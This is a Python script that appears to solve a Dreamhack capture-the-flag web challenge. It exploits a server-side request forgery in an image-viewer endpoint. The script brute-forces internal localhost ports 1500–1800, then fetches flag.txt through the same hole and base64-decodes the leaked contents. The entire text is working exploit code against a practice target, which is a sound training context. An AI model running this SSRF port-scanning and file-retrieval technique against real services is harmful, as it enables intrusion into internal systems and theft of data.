from bs4 import BeautifulSoup
import requests
import base64

url = "http://host1.dreamhack.games:9090/img_viewer"

not_png = 'iVBORw0KGgoAAAANSUhEUgAAA04AAAF4C'

for port in range(1500, 1801):
    data = {
        'url': 'http://Localhost:%d/static/dream.png'%port
    }

    resp = requests.post(url, data=data)

    if resp.text.find(not_png) < 0:
        print('port number : ', port)
        break

data = {
    'url': 'http://Localhost:%d/flag.txt'%port
}

resp = requests.post(url, data=data)

soup = BeautifulSoup(resp.content,"html.parser")

images = soup.findAll('img')
for image in images:
    keyword = "data:image/png;base64, "
    idx = image['src'].find(keyword) 
    if idx > -1 :
        ENC_FLAG = image['src'].replace(keyword, '')
        BASE64_BYTES = ENC_FLAG.encode('utf-8')
        FLAG_BYTES = base64.b64decode(BASE64_BYTES)
        print(FLAG_BYTES.decode('utf-8'))
